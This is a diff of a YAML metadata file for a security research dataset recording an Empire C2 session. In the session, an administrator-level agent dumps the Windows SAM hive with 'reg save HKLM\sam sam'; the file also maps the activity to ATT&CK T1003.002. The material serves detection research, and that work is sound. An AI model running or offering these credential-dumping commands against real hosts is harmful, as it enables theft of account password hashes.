@@ -1,22 +1,22 @@
-title: Empire Reg Dump SAM
+title: Empire Reg Dump SAM Hive
 id: SDWIN-190625133822
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2019/06/25
 modification_date: 2019/06/25
 platform: Windows
+tags:
+  - SAM Rquest Handle
 description: This dataset represents adversaries with administrator privileges using the windows reg utility to dump the SAM registry hive.
-dataset:
-  - type: Host
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/small_datasets/windows/credential_access/host/empire_reg_dump_sam.tar.gz
 attack_mappings:
   - technique: T1003
     sub-technique: "002"
     tactics:
       - TA0006
 notebooks:
-simulator:
-simulator:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/small_datasets/windows/credential_access/host/empire_shell_reg_dump_sam.zip
+simulation:
   environment: Mordor shire
   tools:
     - type: Interactive Session
@@ -26,12 +26,22 @@ simulator:
   permissions_required:
     - Administrator
   adversary_view: |-
-    (Empire: Y298VW3B) > shell reg save HKLM\sam sam
-    [*] Tasked Y298VW3B to run TASK_SHELL
-    [*] Agent Y298VW3B tasked with task ID 5
-    (Empire: Y298VW3B) > The operation completed successfully.
+    (Empire: WE8XYD3K) > agents
+
+    [*] Active agents:
+
+    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+    ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+    WE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5972   5/0.0    2020-09-22 08:27:49  http            
+
+    (Empire: agents) > interact WE8XYD3K
+    (Empire: WE8XYD3K) > shell reg save HKLM\sam sam
+    [*] Tasked WE8XYD3K to run TASK_SHELL
+    [*] Agent WE8XYD3K tasked with task ID 5
+    (Empire: WE8XYD3K) > 
+    The operation completed successfully.
 
     ..Command execution completed.
 
-    (Empire: Y298VW3B) >
+    (Empire: WE8XYD3K) >
 references:
